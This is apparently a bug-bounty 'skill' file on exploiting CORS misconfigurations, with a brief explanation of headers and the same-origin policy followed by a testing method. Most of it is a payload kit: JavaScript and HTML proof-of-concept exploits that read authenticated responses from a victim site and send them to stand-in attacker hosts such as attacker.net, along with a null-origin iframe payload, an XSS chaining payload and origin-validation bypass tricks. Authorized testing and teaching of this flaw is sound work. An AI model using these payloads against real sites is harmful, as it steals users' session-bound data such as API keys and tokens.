---
name: "cors-misconfiguration"
version: "2.0"
category: "api"
subcategory: "cors"
phase: "exploitation"
tags: ["bug-bounty", "cors", "cross-origin", "origin-reflection", "data-exfiltration", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-suite", "corsy", "corscanner", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["csrf", "html-injection", "xss", "information-disclosure-harvesting", "api-fuzzing"]
description: "Bug bounty skill: cors misconfiguration - exploitation phase, api category"
---
# CORS Misconfiguration

## Summary

CORS misconfiguration allows an attacker to make cross-origin requests on behalf of a victim user. When the server reflects the `Origin` header or allows `null` origin with `Access-Control-Allow-Credentials: true`, an attacker can exfiltrate sensitive data.

## Key Concepts

- **CORS (Cross-Origin Resource Sharing)**: Browser mechanism that controls cross-origin requests via HTTP headers
- **`Access-Control-Allow-Origin`**: Specifies which origins are permitted to read the response
- **`Access-Control-Allow-Credentials`**: Indicates whether credentials (cookies, auth headers) are included
- **Preflight request**: OPTIONS request sent before actual cross-origin request for non-simple requests
- **Origin reflection**: Server echoes back whatever Origin header the client sends
- **Null origin**: Some servers whitelist `null`, which can be triggered from `data:` URIs or sandboxed iframes

### Pre-flight Checks

CORS mandates a pre-flight `OPTIONS` request for cross-origin requests using non-standard HTTP methods or custom headers:

```
OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: X-Custom-Header
```

The browser checks if the method and headers are allowed before sending the actual request. Misconfigured pre-flight responses can still enable attacks.

### Same-Origin Policy Reference

| URL Accessed | Access Allowed? | Reason |
|-------------|----------------|--------|
| `http://normal-site.com/example/` | Yes | Same protocol, domain, port |
| `http://normal-site.com/example2/` | Yes | Same protocol, domain, port |
| `https://normal-site.com/example/` | No | Different protocol and port |
| `http://en.normal-site.com/example/` | No | Different domain (subdomain) |
| `http://www.normal-site.com/example/` | No | Different domain |
| `http://normal-site.com:8080/example/` | No | Different port* |

*Internet Explorer ignores the port number when enforcing the same-origin policy.

### CORS Headers Reference

| Header | Type | Purpose |
|--------|------|---------|
| `Access-Control-Allow-Origin` | Response | Specifies allowed origins (`*`, `<origin>`, `null`) |
| `Access-Control-Allow-Credentials` | Response | Allows credentials (cookies, auth headers) when `true` |
| `Access-Control-Allow-Methods` | Response | Lists allowed HTTP methods (POST, GET, PUT, etc.) |
| `Access-Control-Allow-Headers` | Response | Lists allowed custom headers in the actual request |
| `Access-Control-Expose-Headers` | Response | Lists headers the client can access in the response |
| `Access-Control-Max-Age` | Response | How long (seconds) the preflight result can be cached |
| `Access-Control-Request-Method` | Request (preflight) | Tells the server the HTTP method of the actual request |
| `Access-Control-Request-Headers` | Request (preflight) | Tells the server the custom headers of the actual request |
| `Origin` | Request (auto) | Set by browser, indicates the requesting origin |
| `Access-Control-Request-Local-Network` | Request (preflight) | Indicates the request targets a local network resource |
| `Access-Control-Allow-Local-Network` | Response | Permits cross-origin access to local network resources |

### Local Network Request Handling (Private Network Access)

Browsers now require explicit opt-in for public websites to access local network resources. A valid preflight response must include:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
```

**Bypass with `0.0.0.0`:** The IP address `0.0.0.0` is not considered "local" by some browsers and can bypass local network access restrictions to reach localhost services.

**Bypass with public IP mapping:** Using the public IP address of a local endpoint (e.g., the router's public IP) can also bypass local network requirements, since the request appears to target a non-local address.

### Using Network Location as Authentication

Some internal applications use the victim's network location as implicit authentication (IP-based auth). In this scenario, the victim's browser can be used as a proxy to bypass IP-based authentication and access internal network applications via CORS. The impact is similar to DNS rebinding but easier to exploit — no DNS manipulation needed.

### Null Origin Sources

The browser sends `Origin: null` in several cases:
- Cross-origin redirects
- Requests from `data:` URIs (exploitable via sandboxed iframe)
- Requests using `file:` protocol
- Sandboxed cross-origin requests (`<iframe sandbox="allow-scripts">`)
- Serialized data (e.g., `importScripts()` in workers)

### Requirements for Exploitation

- Attacker sends: `Origin: https://evil.com`
- Victim response must have both:
  - `Access-Control-Allow-Credential: true`
  - `Access-Control-Allow-Origin: https://evil.com` **OR** `Access-Control-Allow-Origin: null`

## Technical Details

### Origin Reflection

When the server reflects any Origin header without validation:

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"[private API key]"}
```

### Null Origin

Some servers whitelist the `null` origin, exploitable via `data:` URI in a sandboxed iframe:

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

{"[private API key]"}
```

### Wildcard Origin Without Credentials

If the server responds with `Access-Control-Allow-Origin: *`, the browser never sends cookies. However, on internal networks (no auth required), the attacker can still pivot:

```
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

### Expanding the Origin (Regex Bypass)

**Example 1 — Prefix expansion**: Server accepts any prefix before `example.com`:
- Origin: `https://evilexample.com` → reflected as allowed

**Example 2 — Unescaped dot in regex**: Regex `^api.example.com$` instead of `^api\.example.com$`:
- Origin: `https://apiiexample.com` → reflected as allowed (`.` matches any char)

## Methodology

### Structured Testing Approach

1. **Map the application** — Identify endpoints that return sensitive data and check their CORS headers.
2. **Test dynamic generation** — Does the server reflect a user-supplied `Origin` header value in `Access-Control-Allow-Origin`?
3. **Test string validation** — Does the server only validate the start or end of the origin string (prefix/suffix bypass)?
4. **Test null origin** — Does the server whitelist `null` as an allowed origin?
5. **Test protocol restriction** — Does the server differentiate between `http://` and `https://`?
6. **Test credentials** — Is `Access-Control-Allow-Credentials: true` set alongside a reflected origin?
7. **Determine impact** — What sensitive data can be accessed via the vulnerable CORS configuration?

### Step-by-Step

1. Target an API endpoint on `victim.example.com`
2. Send a request with `Origin: https://evil.com` — check for origin reflection.
3. Send a request with `Origin: null` — check if null origin is whitelisted.
4. Send a request with `Origin: http://sub.target.com` — test if any subdomain is allowed (excessive trust).
5. Send a request with `Origin: https://target.com.evil.com` — test subdomain/prefix regex bypass.
6. Send a request with `Origin: https://target.com` — baseline legitimate origin check.
7. If origin is reflected with `Access-Control-Allow-Credentials: true`, create a PoC page that makes XHR requests with `withCredentials: true`.
8. Exfiltrate the response to your attacker-controlled server.

## Payloads

### Origin Reflection PoC

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

### Origin Reflection PoC (HTML Button Trigger)

```html
<html>
    <body>
        <h2>CORS PoC</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button>
        </div>
        <script>
            function cors() {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                document.getElementById("demo").innerHTML = alert(this.responseText);
                }
            };
             xhr.open("GET",
                      "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
            }
        </script>
    </body>
</html>
```

### Null Origin PoC (data: URI in Sandboxed iframe)

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe>
```

### Wildcard Origin PoC (No Credentials)

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.internal.example.com/endpoint',true);
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

### Expanding Origin PoC (Example 1 — Prefix)

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

### Expanding Origin PoC (Example 2 — Unescaped Dot)

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

### XSS on Trusted Origin Chaining

If a strict whitelist is in place but a trusted origin has XSS, the XSS can be used to make authenticated CORS requests back to the trusting origin. This exploits the trust relationship between the two sites.

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

An attacker who finds XSS on the trusted subdomain can exploit it to retrieve sensitive data:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://attacker.com/log?key='+this.responseText;
    };
</script>
```

The payload is delivered via the XSS vector on the trusted subdomain, and the CORS trust allows the response to be read cross-origin.

## Commands

No specific shell commands — this is a browser-based client-side attack.

## Tools

- **Corsy** (s0md3v) — CORS Misconfiguration Scanner
- **CORScanner** (chenjj) — Fast CORS scanner
- **PostMessage POC Builder** (honoki) — POC builder tool
- **of-cors** (trufflesecurity) — Exploit CORS on internal networks
- **CorsOne** (omranisecurity) — Fast CORS discovery tool
- **Burp Suite** — To intercept and modify Origin headers

## Bypass Techniques

- **Null origin**: Use `data:` URI inside a sandboxed iframe (`sandbox="allow-scripts allow-top-navigation allow-forms"`)
- **Regex bypass (prefix)**: Register a domain that ends with the target's domain as a suffix (e.g., `evilnormal-website.com` for a whitelist matching `normal-website.com`)
- **Regex bypass (suffix)**: Register a domain that starts with the target's domain as a prefix (e.g., `normal-website.com.evil-user.net`)
- **Regex bypass (unescaped dot)**: Replace the dot with any character (e.g., `apiiexample.com` for regex `^api.example.com$`)
- **XSS on trusted origin**: If a whitelisted domain has XSS, inject the CORS exploit through it
- **Method switching**: Set `Origin: attacker.com` and change between GET/POST — some WAFs inspect only GET but accept POST
- **Space injection**: `Origin: sub.attacker target.com` — some parsers accept spaces in origin and may match partial values
- **URL encoding**: `Origin: sub.attacker%target.com` — WAF may decode % differently than the backend
- **Path-like origin**: `Origin: attacker.com/target.com` — some regexes match partial strings when the origin contains a `/`

## Notes

- `*` is the only valid wildcard origin — `https://*.example.com` is NOT valid per spec
- When `Access-Control-Allow-Origin: *` is set, the browser will **not** send credentials (cookies)
- Wildcard origins can still be exploited on internal networks where no auth is required
- The `null` origin attack requires the victim's browser to send a `Origin: null` header — achievable via `data:` URIs, `file:` protocol, or sandboxed iframes
- CORS exploits require the victim to visit the attacker's page while authenticated to the target
- Always target API endpoints that return sensitive data (keys, tokens, PII)

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
- https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
- https://portswigger.net/web-security/cors/lab-breaking-https-attack
- https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
- https://hackerone.com/reports/470298
- https://hackerone.com/reports/426147
- https://hackerone.com/reports/430249
- https://hackerone.com/reports/168574
- https://hackerone.com/reports/235200
